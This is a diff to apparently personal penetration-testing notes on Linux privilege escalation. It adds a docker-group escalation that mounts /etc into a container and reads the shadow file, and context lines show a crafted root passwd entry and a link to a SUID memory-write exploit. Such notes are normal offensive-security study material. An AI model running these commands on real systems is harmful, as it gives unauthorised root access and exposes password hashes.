@@ -295,7 +295,13 @@ Pattern
                pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
         
       4.1.3 Manual
-            id     --> what is running? docker? 
+            id     --> what is running? 
+               Anything suspicious?
+                   https://gtfobins.github.io
+               if docker     # https://www.hackingarticles.in/docker-privilege-escalation/
+                  docker run -v /etc/:/mnt -it alpine
+                  cd /mnt
+                  cat shadow
             ps aux     --> Search for odd program, then searchsploit. 
             Linux Local Privilege Escalation via SUID /proc/pid/mem Write
                     https://git.zx2c4.com/CVE-2012-0056/about/
